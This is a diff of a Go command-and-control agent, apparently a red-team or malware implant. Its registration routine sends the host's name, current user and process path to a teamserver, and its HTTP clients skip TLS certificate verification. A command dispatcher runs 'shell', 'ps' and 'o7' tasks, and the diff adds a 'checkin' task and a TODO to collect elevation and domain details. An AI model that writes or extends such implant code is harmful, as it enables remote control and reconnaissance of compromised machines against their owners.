@@ -69,6 +69,7 @@ func registerAgent(url string, magic []byte, agentId string) string{
 	currentuser, _ := user.Current()
 	procPath, _ := os.Executable()
 
+	// TODO: Get Process Elevated and Domain, completely forgot about it
 	registerDict := map[string]string{
 		"AgentID": agentId,
 		"Hostname": hostname,
@@ -91,7 +92,7 @@ func registerAgent(url string, magic []byte, agentId string) string{
 	requestDat := `{"task":"register","data":` + string(dat) + "}" // defo a better way to do this but eh
 
 	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
-	size := len(requestDat)+12
+	size := len(requestDat) + 12
 	sizeBytes := make([]byte, 4)
 	binary.BigEndian.PutUint32(sizeBytes, uint32(size))
 
@@ -114,7 +115,9 @@ func registerAgent(url string, magic []byte, agentId string) string{
 			// TODO: Verify certificate once we figure out how to do that
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		}
-		client = &http.Client{Transport: tr}
+		client = &http.Client{
+			Transport: tr,
+		}
 	} else {
 		client = &http.Client{}
 	}
@@ -167,7 +170,9 @@ func checkIn(dat string, checkInType string) string{
 			// TODO: Verify certificate once we figure out how to do that
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		}
-		client = &http.Client{Transport: tr}
+		client = &http.Client{
+			Transport: tr,
+		}
 	} else {
 		client = &http.Client{}
 	}
@@ -192,7 +197,7 @@ func checkIn(dat string, checkInType string) string{
 // the teamserver will send it, and we need to reject that
 func validateArgs(cmdArgs []string) bool {
 	// shhh not scuffed not scuffed not scuffed not scuffed
-	if utils.Strip(cmdArgs[0]) == "o7" || utils.Strip(cmdArgs[0]) == "ps" {
+	if utils.Strip(cmdArgs[0]) == "o7" || utils.Strip(cmdArgs[0]) == "ps" || utils.Strip(cmdArgs[0]) == "checkin" {
 		return true
 	}
 	if len(cmdArgs) < 2 {
@@ -214,6 +219,8 @@ func RunCommand(command string) string {
 	*/
 	if validateArgs(cmdArgs) {
 		switch (utils.Strip(cmdArgs[0])){
+		case "checkin":
+			output = functions.CheckIn(&c)
 		case "shell":
 			output = functions.Shell(cmdArgs[1:])
 		case "o7":
